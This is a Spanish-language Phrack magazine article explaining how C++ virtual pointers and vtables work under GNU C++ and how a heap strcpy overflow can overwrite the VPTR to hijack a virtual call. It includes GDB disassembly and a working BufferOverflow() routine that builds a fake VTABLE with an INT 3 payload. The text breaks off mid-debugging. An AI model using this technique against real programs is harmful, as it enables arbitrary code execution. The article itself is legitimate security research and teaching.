                      - P H R A C K   M A G A Z I N E -

                            Volumen 0xa Numero 0x38
                                  05.01.2000
                                  0x08[0x10]

|--------------------------- ROMPIENDO VPTRS DE C++ --------------------------|
|-----------------------------------------------------------------------------|
|-------------------------- rix <rix@securiweb.net> --------------------------|


----|  Introduccion

En este momento, un set de tecnicas ampliamente conocidas nos instruyen
sobre como explotar buffer overflows en programas generalmente escritos en C.
Aunque C es utilizado casi en todos lados, tambien estamos viendo varios
programas siendo escritos en C++.  Para la mayor parte, las tecnicas que
son aplicables en C estan disponibles en C++ tambien, sin embargo, C++ puede
ofrecernos nuevas posibilidades en lo que se refiere a buffer overflows,
mayormente debido al uso de tecnologias orientadas a objetos.  Vamos a
analizar una de estas posibilidades, usando el compilador GNU C++, en un
sistema Linux x86.



----|  Bases de C++

Podemos definir una "class" como una estructura que contiene datos y un set
de funciones (llamadas "metodos").  Entonces, podemos crear variables basadas
en esta definicion de class.  Estas variables son llamadas "objetos".
Por ejemplo, podemos tener el siguiente programa (bo1.cpp):


#include <stdio.h>
#include <string.h>

class MyClass
{ 
    private:
        char Buffer[32];
    public:
        void SetBuffer(char *String)
        {
            strcpy(Buffer, String);
        }
        void PrintBuffer()
        {
            printf("%s\n", Buffer);
        }
};

void main()
{
     MyClass Object;

     Object.SetBuffer("string");
     Object.PrintBuffer();
}


Este peque~o programa define una class MyClass que posee 2 metodos:

1) Un metodo SetBuffer(), que llena un buffer interno para la class (Buffer).
2) Un metodo PrintBuffer(), que muestra el contenido de este buffer.

Entonces, podemos definir un objeto Object basado en la class MyClass.
Inicialmente, notaremos que el metodo SetBuffer() usa una funcion
*muy peligrosa* para llenar Buffer, strcpy()...

Como sucede, usando programacion orientada a objetos en este ejemplo
simplicista no nos muestra muchas ventajas.  Por otro lado, un mecanismo
muy a menudo usado en programacion orientada a objetos es el mecanismo
de inherencia.  Consideremos el siguiente programa (bo2.cpp), usando el
mecanismo de inherencia para crear 2 classes con metodos PrintBuffer()
distintos:


#include <stdio.h>
#include <string.h>

class BaseClass
{
    private:
        char Buffer[32];
    public:
        void SetBuffer(char *String)
        {
            strcpy(Buffer,String);
        }
        virtual void PrintBuffer()
        {
            printf("%s\n",Buffer);
        }
};

class MyClass1:public BaseClass
{
    public:
        void PrintBuffer()
        {
            printf("MyClass1: ");
            BaseClass::PrintBuffer();
        }
};

class MyClass2:public BaseClass
{
    public:
        void PrintBuffer()
        {
            printf("MyClass2: ");
            BaseClass::PrintBuffer();
        }
};

void main()
{
    BaseClass *Object[2];

    Object[0] = new MyClass1;
    Object[1] = new MyClass2; 

    Object[0]->SetBuffer("string1");
    Object[1]->SetBuffer("string2");
    Object[0]->PrintBuffer();
    Object[1]->PrintBuffer();
}


Este programa crea 2 classes distintas (MyClass1, MyClass2) que son derivados
de una class BaseClass.  Estas 2 classes difieren en el nivel de display
(metodo PrintBuffer()).  Cada una tiene su propio metodo PrintBuffer(), pero
ambas llaman al metodo original PrintBuffer() (desde BaseClass).  A
continuacion, tenemos la funcion main() que define un array de punteros para
dos objetos de class BaseClass.  Cada uno de esos objetos es creado,
como derivado de MyClass1 o MyClass2.
Luego llamamos a los metodos SetBuffer() y PrintBuffer() de estos dos
objetos.  Ejecutando el programa produce este output.

rix@pentium:~/BO> bo2
MyClass1: string1
MyClass2: string2
rix@pentium:~/BO>

Ahora notamos la ventaja de la programacion orientada a objetos.  Tenemos
las mismas llamadas primitivas a PrintBuffer() para dos classes diferentes!
Este es el resultado final de los metodos virtuales.  Los metodos
virtuales nos permiten redefinir nuevas versiones de metodos de nuestras
classes base, o para definir un metodo de las classes base (si la class
base es resumida puramente) en una clase derivada.  Si no declaramos el
metodo como virtual, el compilador puede hacer la resolucion de llamada
en tiempo de compilacion ("static binding").  Para resolver la llamada
en tiempo de ejecucion (porque esta llamada depende de la clase de
objetos que tenemos en nuestro array Object[]), debemos declarar nuestro
metodo PrintBuffer() como "virtual".  El compilador usara entonces un
binding dinamico, y calculara la direccion para la llamada en tiempo
de ejecucion.


----|  VPTR C++

Ahora vamos a analizar en una manera mas detallada este mecanismo de binding
dinamico.  Tomemos el caso de nuestra class BaseClass y sus classes
derivadas.

El compilador primero busca la declaracion de BaseClass.  Inicialmente,
reserva 32 bytes para la definicion de Buffer.  Luego, lee la declaracion
del metodo SetBuffer() (no virtual) y asigna directamente la direccion
correspondiente en el codigo.  Finalmente, lee la declaracion del metodo
PrintBuffer() (virtual).  En este caso, en lugar de hacer un binding
estatico, hace un binding dinamico, y reserva 4 bytes en la class
(estos 4 bytes contendran un puntero).  Ahora tenemos la siguiente
estructura:

        BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBVVVV

Donde: B representa un byte de Buffer.
       V representa un byte de nuestro puntero.

Este puntero es llamado "VPTR" (Virtual Pointer), y apunta a una entrada
en un array de punteros de funcion.  Estos apuntan a metodos
(relativos a la class).  Hay una VTABLE para una class, que contiene
solo punteros a metodos de toda clase.  Ahora tenemos el siguiente
diagrama:

Object[0]: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBVVVV
                                           =+==
					    |
	     +------------------------------+
	     |
	     +--> VTABLE_MyClass1: IIIIIIIIIIIIPPPP

Object[1]: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBWWWW
                                           =+==
					    |
	     +------------------------------+
	     |
	     +--> VTABLE_MyClass2: IIIIIIIIIIIIQQQQ

Donde: B representa un byte de Buffer.
       V representa un byte del VPTR a VTABLE_MyClass1.
       W representa un byte del VPTR a VTABLE_MyClass2.
       I representa varios bytes de informacion.
       P representa un byte del puntero al metodo PrintBuffer() de MyClass1.
       Q representa un byte del puntero al metodo PrintBuffer() de MyClass2.

Si tuvimos un tercer objeto de class MyClass1, por ejemplo, podemos tener:

Object[2]: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBVVVV

con VVVV que puede apuntar a VTABLE_MyClass1.

Notamos que el VPTR esta ubicado despues de nuestro Buffer en la memoria
del proceso.  Ya que llenamos este buffer via la funcion strcpy(),
deducimos facilmente que podemos alcanzar el VPTR llenando el buffer!

NOTA: Despues de algunos tests bajo Windows, parece que Visual C++ 6.0
ubica el VPTR justo al comienzo del objeto, que nos previene de usar
esta tecnica.  Por otro lado, GNU C++ ubica el VPTR al final del objeto
(que es lo que queremos).


----|  Analisis de VPTR usando GDB

Ahora observaremos el mecanismo mas precisamente, usando un debugger.
Para esto, compilamos nuestro programa y ejecutamos GDB:

rix@pentium:~/BO > gcc -o bo2 bo2.cpp
rix@pentium:~/BO > gdb bo2
GNU gdb 4.17.0.11 with Linux support
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i686-pc-linux-gnu"...
(gdb) disassemble main
Dump of assembler code for function main:
0x80485b0 <main>:       pushl  %ebp
0x80485b1 <main+1>:     movl   %esp,%ebp
0x80485b3 <main+3>:     subl   $0x8,%esp
0x80485b6 <main+6>:     pushl  %edi
0x80485b7 <main+7>:     pushl  %esi
0x80485b8 <main+8>:     pushl  %ebx
0x80485b9 <main+9>:     pushl  $0x24
0x80485bb <main+11>:    call   0x80487f0 <___builtin_new>
0x80485c0 <main+16>:    addl   $0x4,%esp
0x80485c3 <main+19>:    movl   %eax,%eax
0x80485c5 <main+21>:    pushl  %eax
0x80485c6 <main+22>:    call   0x8048690 <__8MyClass1>
0x80485cb <main+27>:    addl   $0x4,%esp
0x80485ce <main+30>:    movl   %eax,%eax
0x80485d0 <main+32>:    movl   %eax,0xfffffff8(%ebp)
0x80485d3 <main+35>:    pushl  $0x24
0x80485d5 <main+37>:    call   0x80487f0 <___builtin_new>
0x80485da <main+42>:    addl   $0x4,%esp
0x80485dd <main+45>:    movl   %eax,%eax
0x80485df <main+47>:    pushl  %eax
0x80485e0 <main+48>:    call   0x8048660 <__8MyClass2>
0x80485e5 <main+53>:    addl   $0x4,%esp
0x80485e8 <main+56>:    movl   %eax,%eax
---Type <return> to continue, or q <return> to quit---
0x80485ea <main+58>:    movl   %eax,0xfffffffc(%ebp)
0x80485ed <main+61>:    pushl  $0x8048926
0x80485f2 <main+66>:    movl   0xfffffff8(%ebp),%eax
0x80485f5 <main+69>:    pushl  %eax
0x80485f6 <main+70>:    call   0x80486c0 <SetBuffer__9BaseClassPc>
0x80485fb <main+75>:    addl   $0x8,%esp
0x80485fe <main+78>:    pushl  $0x804892e
0x8048603 <main+83>:    movl   0xfffffffc(%ebp),%eax
0x8048606 <main+86>:    pushl  %eax
0x8048607 <main+87>:    call   0x80486c0 <SetBuffer__9BaseClassPc>
0x804860c <main+92>:    addl   $0x8,%esp
0x804860f <main+95>:    movl   0xfffffff8(%ebp),%eax
0x8048612 <main+98>:    movl   0x20(%eax),%ebx
0x8048615 <main+101>:   addl   $0x8,%ebx
0x8048618 <main+104>:   movswl (%ebx),%eax
0x804861b <main+107>:   movl   %eax,%edx
0x804861d <main+109>:   addl   0xfffffff8(%ebp),%edx
0x8048620 <main+112>:   pushl  %edx
0x8048621 <main+113>:   movl   0x4(%ebx),%edi
0x8048624 <main+116>:   call   *%edi
0x8048626 <main+118>:   addl   $0x4,%esp
0x8048629 <main+121>:   movl   0xfffffffc(%ebp),%eax
0x804862c <main+124>:   movl   0x20(%eax),%esi
0x804862f <main+127>:   addl   $0x8,%esi
---Type <return> to continue, or q <return> to quit---
0x8048632 <main+130>:   movswl (%esi),%eax
0x8048635 <main+133>:   movl   %eax,%edx
0x8048637 <main+135>:   addl   0xfffffffc(%ebp),%edx
0x804863a <main+138>:   pushl  %edx
0x804863b <main+139>:   movl   0x4(%esi),%edi
0x804863e <main+142>:   call   *%edi
0x8048640 <main+144>:   addl   $0x4,%esp
0x8048643 <main+147>:   xorl   %eax,%eax
0x8048645 <main+149>:   jmp    0x8048650 <main+160>
0x8048647 <main+151>:   movl   %esi,%esi
0x8048649 <main+153>:   leal   0x0(%edi,1),%edi
0x8048650 <main+160>:   leal   0xffffffec(%ebp),%esp
0x8048653 <main+163>:   popl   %ebx
0x8048654 <main+164>:   popl   %esi
0x8048655 <main+165>:   popl   %edi
0x8048656 <main+166>:   movl   %ebp,%esp
0x8048658 <main+168>:   popl   %ebp
0x8048659 <main+169>:   ret
0x804865a <main+170>:   leal   0x0(%esi),%esi
End of assembler dump.

Analicemos, en una manera detallada, que hace nuestra funcion main():

0x80485b0 <main>:       pushl  %ebp
0x80485b1 <main+1>:     movl   %esp,%ebp
0x80485b3 <main+3>:     subl   $0x8,%esp
0x80485b6 <main+6>:     pushl  %edi
0x80485b7 <main+7>:     pushl  %esi
0x80485b8 <main+8>:     pushl  %ebx

El programa crea un stack frame, luego reserva 8 bytes en la pila (este
es nuestro array Object[] local), que contendra 2 punteros a 4 bytes cada
uno,respectivamente en 0xfffffff8 (%ebp) para Object[0] y en 0xfffffffc (%ebp)
para Object[1].  Luego, guarda varios registros.

0x80485b9 <main+9>:     pushl  $0x24
0x80485bb <main+11>:    call   0x80487f0 <___builtin_new>
0x80485c0 <main+16>:    addl   $0x4,%esp

El programa ahora llama a ___builtin_new, que reserva 0x24 (36 bytes)
en el heap para nuestro Object[0] y nos envia la direccion de estos bytes
reservados en EAX.  Estos 36 bytes representan 32 bytes para nuestro
buffer seguido por 4 bytes para nuestro VPTR.


0x80485c3 <main+19>:    movl   %eax,%eax
0x80485c5 <main+21>:    pushl  %eax
0x80485c6 <main+22>:    call   0x8048690 <__8MyClass1>
0x80485cb <main+27>:    addl   $0x4,%esp

Aqui, ubicamos la direccion del objeto (contenida en EAX) en la pila,
luego llamamos a la funcion __8MyClass1.  Esta funcion es en realidad
la constructora de la class MyClass1.  Es necesario notar tambien que en C++,
todos los metodos incluyen un parametro adicional "secreto".  Que es la
direccion del objeto que ejecuta realmente el metodo (el puntero "This").
Analicemos las instruccciones desde su constructor:

(gdb) disassemble __8MyClass1
Dump of assembler code for function __8MyClass1:
0x8048690 <__8MyClass1>:        pushl  %ebp
0x8048691 <__8MyClass1+1>:      movl   %esp,%ebp
0x8048693 <__8MyClass1+3>:      pushl  %ebx
0x8048694 <__8MyClass1+4>:      movl   0x8(%ebp),%ebx

EBX ahora contiene el puntero a los 36 bytes reservados (puntero "This").

0x8048697 <__8MyClass1+7>:      pushl  %ebx
0x8048698 <__8MyClass1+8>:      call   0x8048700 <__9BaseClass>
0x804869d <__8MyClass1+13>:     addl   $0x4,%esp

Aqui, llamamos al constructor de la class BaseClass.

(gdb) disass __9BaseClass
Dump of assembler code for function __9BaseClass:
0x8048700 <__9BaseClass>:       pushl  %ebp
0x8048701 <__9BaseClass+1>:     movl   %esp,%ebp
0x8048703 <__9BaseClass+3>:     movl   0x8(%ebp),%edx

EDX recibe el puntero para los 36 bytes reservados (puntero "This").

0x8048706 <__9BaseClass+6>:     movl   $0x8048958,0x20(%edx)

Los 4 bytes situados en EDX+0x20 (=EDX+32) reciben el valor $0x8048958.
Luego, la funcion __9BaseClass se extiende un poco mas lejos.  Si cargamos:

(gdb) x/aw 0x08048958
0x8048958 <_vt.9BaseClass>:     0x0

Observamos que el valor que esta escrito en EDX+0x20 (el VPTR del objeto
reservado) recibe la direccion de la VTABLE de la class BaseClass.
Volviendo al codigo del constructor MyClass1:

0x80486a0 <__8MyClass1+16>:     movl   $0x8048948,0x20(%ebx)

Escribe el valor 0x8048948 a EBX+0x20 (VPTR).  De nuevo, la funcion se
extiende un poco mas lejos.  Carguemos:

(gdb) x/aw 0x08048948
0x8048948 <_vt.8MyClass1>:      0x0

Observamos que el VPTR es sobreescrito, y que ahora recibe la direccion de
la VTABLE de la class MyClass1.  Nuestra funcion main() vuelve (en EAX)
a apuntar al objeto asignado en memoria.

0x80485ce <main+30>:    movl   %eax,%eax
0x80485d0 <main+32>:    movl   %eax,0xfffffff8(%ebp)

Este puntero es ubicado en Object[0].  Luego, el programa usa el mismo
mecanismo para Object[1], evidentemente con diferentes direcciones.
Despues de toda la inicializacion, son ejecutadas las siguientes
instrucciones:

0x80485ed <main+61>:    pushl  $0x8048926
0x80485f2 <main+66>:    movl   0xfffffff8(%ebp),%eax
0x80485f5 <main+69>:    pushl  %eax

Aqui, primero ubicamos la direccion 0x8048926 asi como tambien el valor de
Object[0] en la pila (puntero "This").  Observando la direccion 0x8048926:

(gdb) x/s 0x08048926
0x8048926 <_fini+54>:    "string1"

Notamos que esta direccion contiene "string1" que va a ser copiada en
Buffer via la funcion SetBuffer() de la class BaseClass.

0x80485f6 <main+70>:    call   0x80486c0 <SetBuffer__9BaseClassPc>
0x80485fb <main+75>:    addl   $0x8,%esp

Llamamos al metodo SetBuffer() de la class BaseClass.  Es interesante
observar que la llamada del metodo SetBuffer es un binding estatico
(porque no es un metodo virtual).  El mismo principio es utilizado para
el metodo SetBuffer() relativo a Object[1].

Para verificar que nuestros 2 objetos son inicializados correctamente en
tiempo de ejecucion, vamos a instalar los siguientes breakpoints:

0x80485c0: para obtener la direccion del 1er objeto.
0x80485da: para obtener la direccion del 2do objeto.
0x804860f: para verificar que las inicializaciones de objetos tomaron lugar.

(gdb) break *0x80485c0
Breakpoint 1 at 0x80485c0
(gdb) break *0x80485da
Breakpoint 2 at 0x80485da
(gdb) break *0x804860f
Breakpoint 3 at 0x804860f

Finalmente ejecutamos el programa:

Starting program: /home/rix/BO/bo2
Breakpoint 1, 0x80485c0 in main ()

Mientras consultamos EAX, tendremos la direccion de nuestro 1er objeto:

(gdb) info reg eax
     eax:  0x8049a70   134519408

Luego, continuamos con el siguiente breakpoint:

(gdb) cont
Continuing.
Breakpoint 2, 0x80485da in main ()

Notamos la direccion de nuestro segundo objeto:

(gdb) info reg eax
     eax:  0x8049a98   134519448

Ahora podemos ejecutar los constructores y los metodos SetBuffer():

(gdb) cont
Continuing.
Breakpoint 3, 0x804860f in main ()

Notemos que nuestros 2 objetos siguen en memoria (0x8049a70 y 0x8049a98).
Sin embargo, 0x8049a98 - 0x8049a70 = 0x28, lo cual significa que hay 4
bytes que han sido aparentemente insertados entre el 1er y el 2do objeto.
Si queremos ver estos bytes:

(gdb) x/aw 0x8049a98-4
0x8049a94:      0x29

Observamos que contienen el valor 0x29.  El 2do objeto esta tambien seguido
por 4 bytes particulares:

(gdb) x/xb 0x8049a98+32+4
0x8049abc:      0x49

Ahora vamos a mostrar de una manera mas precisa la estructura interna de
cada uno de nuestros objetos (ahora inicializados):

(gdb) x/s 0x8049a70
0x8049a70:       "string1"
(gdb) x/a 0x8049a70+32
0x8049a90:      0x8048948 <_vt.8MyClass1>
(gdb) x/s 0x8049a98
0x8049a98:       "string2"
(gdb) x/a 0x8049a98+32
0x8049ab8:      0x8048938 <_vt.8MyClass2>

Podemos mostrar el contenido de las VTABLEs de cada una de nuestras classes:

(gdb) x/a 0x8048948
0x8048948 <_vt.8MyClass1>:      0x0
(gdb) x/a 0x8048948+4
0x804894c <_vt.8MyClass1+4>:    0x0
(gdb) x/a 0x8048948+8
0x8048950 <_vt.8MyClass1+8>:    0x0
(gdb) x/a 0x8048948+12
0x8048954 <_vt.8MyClass1+12>:   0x8048770 <PrintBuffer__8MyClass1>
(gdb) x/a 0x8048938
0x8048938 <_vt.8MyClass2>:      0x0
(gdb) x/a 0x8048938+4
0x804893c <_vt.8MyClass2+4>:    0x0
(gdb) x/a 0x8048938+8
0x8048940 <_vt.8MyClass2+8>:    0x0
(gdb) x/a 0x8048938+12
0x8048944 <_vt.8MyClass2+12>:   0x8048730 <PrintBuffer__8MyClass2>

Vemos que el metodo PrintBuffer(9 es tambien el 4to metodo en la VTABLE
de nuestras classes.  A continuacion, vamos a analizar el mecanismo para
binding dinamico.  Continuaremos ejecutando y mostrando registros y
memoria utilizados.  Ejecutaremos el codigo de la funcion main() paso
por paso, con instrucciones:

(gdb) ni

Ahora vamos a ejecutar las siguientes instrucciones:

0x804860f <main+95>:    movl   0xfffffff8(%ebp),%eax

Esta instruccion va a hacer que EAX apunte al 1er objeto.

0x8048612 <main+98>:    movl   0x20(%eax),%ebx
0x8048615 <main+101>:   addl   $0x8,%ebx

Estas instrucciones van a hacer que EBX apunte a la 3er direccion de la
VTABLE de la class MyClass1.

0x8048618 <main+104>:   movswl (%ebx),%eax
0x804861b <main+107>:   movl   %eax,%edx

Estas instrucciones van a cargar el word en el offset +8 en la VTABLE para
EDX.

0x804861d <main+109>:   addl   0xfffffff8(%ebp),%edx
0x8048620 <main+112>:   pushl  %edx

Estas instrucciones agregan a EDX el offset del 1er objeto, y ubican la
direccion resultante (puntero This) en la pila.

0x8048621 <main+113>:   movl   0x4(%ebx),%edi      // EDI = *(VPTR+8+4)
0x8048624 <main+116>:   call   *%edi               // ejecuta el codigo en EDI

Estas instrucciones ubican en EDI la 4ta direccion (VPTR+8+4) de la VTABLE,
que es la direccion del metodo PrintBuffer() de la class MyClass1. Luego,
es ejecutado este metodo.  El mismo mecanismo es usado para ejecutar el
metodo PrintBuffer() de la clase MyClass2.  Finalmente, la funcion main()
termina un poco mas lejos, usando un RET.

Hemos observado un "manejo extra~o", para apuntar al principio de nuestro
objeto en memoria, ya que fuimos a mirar por un word offset en VPTR+8 para
agregarlo a la direccion de nuestro 1er objeto.  Esta manipulacion no
sirve de nada en este caso preciso, porque el valor apuntado por VPTR+8
fue 0:

(gdb) x/a 0x8048948+8
0x8048950 <_vt.8MyClass1+8>:    0x0

Sin embargo, esta manipulacion es necesaria en varios casos convenientes.
Ese es el porque es importante notarla.  Volveremos a este mecanismo luego,
porque provocara algunos problemas mas tarde.


----|  Explotando VPTR

Ahora vamos a tratar de explotar el buffer overflow de una manera simple.
Para esto, debemos proceder asi:
- Para construir nuestra propia VTABLE, cuyas direcciones apuntaran al codigo
que queremos que ejecute por ejemplo ;)
- Para overflowear el contenido del VPTR para que apunte a nuestra propia
VTABLE.

Una de estas metas a alcanzar, es codear nuestra VTABLE al principio del
buffer que overflowearemos.  Entonces, debemos configurar un valor VPTR
para que apunte de regreso al comienzo de nuestro buffer (nuestra VTABLE).
Podemos, o ubicar nuestro shellcode directamente despues de nuestra VTABLE
en nuestro buffer, o ubicarlo despues del valor del VPTR que vamos a
sobreescribir.
Sin embargo, si ubicamos nuestro shellcode despues del VPTR, es necesario
estar seguros que tenemos acceso a esta parte de la memoria, para no
provocar segmentation faults.
Esta consideracion depende en gran medida del tama~o del buffer.
Un buffer de tama~o grande podra contener una VTABLE  y un shellcode sin
problemas, y asi evitar todos los riesgos de segmentation faults.
Recordemosnos que nuestros objetos estan seguidos al mismo tiempo de
una secuencia de 4 bytes (0x29, 0x49), y que podemos escribir nuestro 00h
sin problemas (final del string) al byte detras de nuestro VPTR.

Para chequear vamos a ubicar nuestro shellcode justamente antes de nuestro
VPTR.  Vamos a adoptar la siguiente estructura en nuestro buffer:

 +------(1)---<----------------+
 |                             |
 |                           ==+=
SSSS ..... SSSS ....  B ... CVVVV0
==+=       =+==             |
  |         |               |
  +----(2)--+->-------------+

Donde: V representa bytes de la direccion del comienzo de nuestro buffer.
       S representa bytes de la direccion de nuestro shellcode, aqui la
        direccion de C (direccion S=direccion V+offset VPTR en el buffer-1
        en este caso, porque hemos ubicado nuestro shellcode justamente
        antes del VPTR).
       B representa los posibles bytes de cualquier alineamiento de valores
        (NOPs:), para alinear el valor de nuestro VPTR en el VPTR del objeto.
       C representa el byte del shellcode, en este caso, un simple byte CCh
        (INT 3), que provocara una se~al SIGTRAP.
       0 representa el byte 00h, que estara al final de nuestro buffer
        (para la funcion strcpy()).

El numero de direcciones a poner al comienzo de nuestro buffer (SSSS) depende
si sabemos o no el indice en la VTABLE del 1er metodo que sera llamado
despues de nuestro overflow:
O sabemos este indice, y entonces escribimos el puntero correspondiente.
O no sabemos este indice, y generamos un numero maximo de punteros. Entonces,
esperamos que el metodo que sera ejecutado usara uno de esos punteros
sobreescritos. Nota que no es muy usual una class que contenga 200 metodos ;)
La direcciona a poner en VVVV (nuestro VPTR) depende principalmente de la
ejecucion del programa.
Es necesario notar aqui que nuestros objetos fueron asignados en el heap,
y que es dificil saber exactamente sus direcciones.

Vamos a escribir una peque~a funcion que nos construira un buffer.
Esta funcion recibira 2 parametros:
- BufferAddress: la direccion del comienzo del buffer que overflowearemos.
- NAddress: el numero de direcciones que queremos en nuestra VTABLE.

Aqui esta el codigo de nuestra funcion BufferOverflow():


char *BufferOverflow(unsigned long BufferAddress,int NAddress,int VPTROffset) {
 char *Buffer;
 unsigned long *LongBuffer;
 unsigned long CCOffset;
 int i;
 
 Buffer=(char*)malloc(VPTROffset+4);
  // asigna el buffer.

 CCOffset=(unsigned long)VPTROffset-1;
  // calcula el offset del codigo a ejecutar en el buffer.
  
 for (i=0;i<VPTROffset;i++) Buffer[i]='\x90';
  // llena el buffer con 90h (NOP, viejo habito:)))
  
 LongBuffer=(unsigned long*)Buffer;
  // construye un puntero para ubicar direcciones en nuestra VTABLE.
  
 for (i=0;i<NAddress;i++) LongBuffer[i]=BufferAddress+CCOffset;
  // llena nuestra VTABLE al comienzo del buffer con la direccion del 
  // shellcode.
  
 LongBuffer=(unsigned long*)&Buffer[VPTROffset];
  // construye un puntero en VPTR.
  
 *LongBuffer=BufferAddress;
  // valor que sobreescribira VPTR.
  
 Buffer[CCOffset]='\xCC';
  // nuestro codigo ejecutable.

 Buffer[VPTROffset+4]='\x00';
  // termina por un caracter 00h (string final).
 
 return Buffer; 
}


En nuestro programa podemos ahora llamar a nuestra funcion BufferOverflow(),
con parametros como:
- la direccion de nuestro buffer, aqui la direccion de nuestro objeto
  (Object[0]).
- 4 valores en nuestra VTABLE, en este caso (ya que PrintBuffer() esta en
  VTABLE+8+4).
- 32 como offset para VPTR.
Aqui esta el codigo resultante (bo3.cpp):


#include <stdio.h>
#include <string.h>
#include <malloc.h>

class BaseClass { 
private:
 char Buffer[32];
public:
 void SetBuffer(char *String) {
  strcpy(Buffer,String);
 }
 virtual void PrintBuffer() {
  printf("%s\n",Buffer);
 }
};

class MyClass1:public BaseClass {
public:
 void PrintBuffer() {
  printf("MyClass1: ");
  BaseClass::PrintBuffer();
 }
};

class MyClass2:public BaseClass {
public:
 void PrintBuffer() {
  printf("MyClass2: ");
  BaseClass::PrintBuffer();
 }
};

char *BufferOverflow(unsigned long BufferAddress,int NAddress,int VPTROffset) {
 char *Buffer;
 unsigned long *LongBuffer;
 unsigned long CCOffset;
 int i;
 
 Buffer=(char*)malloc(VPTROffset+4+1);

 CCOffset=(unsigned long)VPTROffset-1; 
 for (i=0;i<VPTROffset;i++) Buffer[i]='\x90';
 LongBuffer=(unsigned long*)Buffer;
 for (i=0;i<NAddress;i++) LongBuffer[i]=BufferAddress+CCOffset;
 LongBuffer=(unsigned long*)&Buffer[VPTROffset];
 *LongBuffer=BufferAddress;
 Buffer[CCOffset]='\xCC';
 Buffer[VPTROffset+4]='\x00';
 return Buffer; 
}

void main() {
 BaseClass *Object[2];

 Object[0]=new MyClass1;
 Object[1]=new MyClass2; 
 Object[0]->SetBuffer(BufferOverflow((unsigned long)&(*Object[0]),4,32));  
 Object[1]->SetBuffer("string2");
 Object[0]->PrintBuffer();
 Object[1]->PrintBuffer();
}


Compilamos, y cargamos GDB:

rix@pentium:~/BO > gcc -o bo3 bo3.cpp
rix@pentium:~/BO > gdb bo3
...
(gdb) disass main
Dump of assembler code for function main:
0x8048670 <main>:       pushl  %ebp
0x8048671 <main+1>:     movl   %esp,%ebp
0x8048673 <main+3>:     subl   $0x8,%esp
0x8048676 <main+6>:     pushl  %edi
0x8048677 <main+7>:     pushl  %esi
0x8048678 <main+8>:     pushl  %ebx
0x8048679 <main+9>:     pushl  $0x24
0x804867b <main+11>:    call   0x80488c0 <___builtin_new>
0x8048680 <main+16>:    addl   $0x4,%esp
0x8048683 <main+19>:    movl   %eax,%eax
0x8048685 <main+21>:    pushl  %eax
0x8048686 <main+22>:    call   0x8048760 <__8MyClass1>
0x804868b <main+27>:    addl   $0x4,%esp
0x804868e <main+30>:    movl   %eax,%eax
0x8048690 <main+32>:    movl   %eax,0xfffffff8(%ebp)
0x8048693 <main+35>:    pushl  $0x24
0x8048695 <main+37>:    call   0x80488c0 <___builtin_new>
0x804869a <main+42>:    addl   $0x4,%esp
0x804869d <main+45>:    movl   %eax,%eax
0x804869f <main+47>:    pushl  %eax
0x80486a0 <main+48>:    call   0x8048730 <__8MyClass2>
0x80486a5 <main+53>:    addl   $0x4,%esp
0x80486a8 <main+56>:    movl   %eax,%eax
---Type <return> to continue, or q <return> to quit---
0x80486aa <main+58>:    movl   %eax,0xfffffffc(%ebp)
0x80486ad <main+61>:    pushl  $0x20
0x80486af <main+63>:    pushl  $0x4
0x80486b1 <main+65>:    movl   0xfffffff8(%ebp),%eax
0x80486b4 <main+68>:    pushl  %eax
0x80486b5 <main+69>:    call   0x80485b0 <BufferOverflow__FUlii>
0x80486ba <main+74>:    addl   $0xc,%esp
0x80486bd <main+77>:    movl   %eax,%eax
0x80486bf <main+79>:    pushl  %eax
0x80486c0 <main+80>:    movl   0xfffffff8(%ebp),%eax
0x80486c3 <main+83>:    pushl  %eax
0x80486c4 <main+84>:    call   0x8048790 <SetBuffer__9BaseClassPc>
0x80486c9 <main+89>:    addl   $0x8,%esp
0x80486cc <main+92>:    pushl  $0x80489f6
0x80486d1 <main+97>:    movl   0xfffffffc(%ebp),%eax
0x80486d4 <main+100>:   pushl  %eax
0x80486d5 <main+101>:   call   0x8048790 <SetBuffer__9BaseClassPc>
0x80486da <main+106>:   addl   $0x8,%esp
0x80486dd <main+109>:   movl   0xfffffff8(%ebp),%eax
0x80486e0 <main+112>:   movl   0x20(%eax),%ebx
0x80486e3 <main+115>:   addl   $0x8,%ebx
0x80486e6 <main+118>:   movswl (%ebx),%eax
0x80486e9 <main+121>:   movl   %eax,%edx
0x80486eb <main+123>:   addl   0xfffffff8(%ebp),%edx
---Type <return> to continue, or q <return> to quit---
0x80486ee <main+126>:   pushl  %edx
0x80486ef <main+127>:   movl   0x4(%ebx),%edi
0x80486f2 <main+130>:   call   *%edi
0x80486f4 <main+132>:   addl   $0x4,%esp
0x80486f7 <main+135>:   movl   0xfffffffc(%ebp),%eax
0x80486fa <main+138>:   movl   0x20(%eax),%esi
0x80486fd <main+141>:   addl   $0x8,%esi
0x8048700 <main+144>:   movswl (%esi),%eax
0x8048703 <main+147>:   movl   %eax,%edx
0x8048705 <main+149>:   addl   0xfffffffc(%ebp),%edx
0x8048708 <main+152>:   pushl  %edx
0x8048709 <main+153>:   movl   0x4(%esi),%edi
0x804870c <main+156>:   call   *%edi
0x804870e <main+158>:   addl   $0x4,%esp
0x8048711 <main+161>:   xorl   %eax,%eax
0x8048713 <main+163>:   jmp    0x8048720 <main+176>
0x8048715 <main+165>:   leal   0x0(%esi,1),%esi
0x8048719 <main+169>:   leal   0x0(%edi,1),%edi
0x8048720 <main+176>:   leal   0xffffffec(%ebp),%esp
0x8048723 <main+179>:   popl   %ebx
0x8048724 <main+180>:   popl   %esi
0x8048725 <main+181>:   popl   %edi
0x8048726 <main+182>:   movl   %ebp,%esp
0x8048728 <main+184>:   popl   %ebp
---Type <return> to continue, or q <return> to quit---
0x8048729 <main+185>:   ret
0x804872a <main+186>:   leal   0x0(%esi),%esi
End of assembler dump.

Ahora, instalamos un breakpoint en 0x8048690, para obtener la direccion de
nuestro 1er objeto.

(gdb) break *0x8048690
Breakpoint 1 at 0x8048690

Y finalmente, cargamos nuestro programa:

(gdb) run
Starting program: /home/rix/BO/bo3
Breakpoint 1, 0x8048690 in main ()

Leemos la direccion de nuestro 1er objeto:

(gdb) info reg eax
     eax:  0x8049b38   134519608

Luego proseguimos, mientras esperamos que todo pase como esta previsto... :)

Continuing.
